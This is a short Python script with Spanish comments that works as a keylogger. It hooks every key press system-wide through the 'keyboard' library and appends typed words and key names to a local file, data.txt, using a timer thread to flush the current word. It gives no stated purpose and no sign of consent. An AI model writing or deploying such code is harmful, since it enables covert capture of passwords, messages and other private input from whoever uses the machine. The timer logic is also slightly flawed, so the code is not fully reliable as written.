import keyboard
import threading
import time

# Variable para controlar si se está escribiendo una palabra actualmente
escribiendo_palabra = False
# Variable para almacenar la palabra actual
palabra_actual = ""

# Función para registrar la última frase después de 1.5 segundos sin presionar espacio
def registrar_ultima_frase():
    global escribiendo_palabra, palabra_actual
    
    with open('data.txt', 'a') as file:
        # Escribir la palabra actual al archivo
        if escribiendo_palabra:
            file.write(palabra_actual)
            palabra_actual = ""
        escribiendo_palabra = False

# Función que se ejecuta en un hilo separado para el temporizador
def temporizador_registrar_ultima_frase():
    time.sleep(1.5)
    registrar_ultima_frase()

def pressedKeys(key):
    global escribiendo_palabra, palabra_actual
    
    with open('data.txt', 'a') as file:
        if key.name == 'space':
            # Si se está escribiendo una palabra, escribir la palabra actual sin espacio adicional
            if escribiendo_palabra:
                file.write(palabra_actual)
                palabra_actual = ""
            # Escribir el espacio
            file.write(' ')
            escribiendo_palabra = False
        else:
            # Si la tecla presionada no es espacio, considerar que se está escribiendo una palabra
            escribiendo_palabra = True
            palabra_actual += key.name
            
            # Iniciar el temporizador si no está activo
            if 'temporizador' not in globals() or not temporizador.is_alive():
                temporizador = threading.Thread(target=temporizador_registrar_ultima_frase)
                temporizador.start()

keyboard.on_press(pressedKeys)
keyboard.wait()
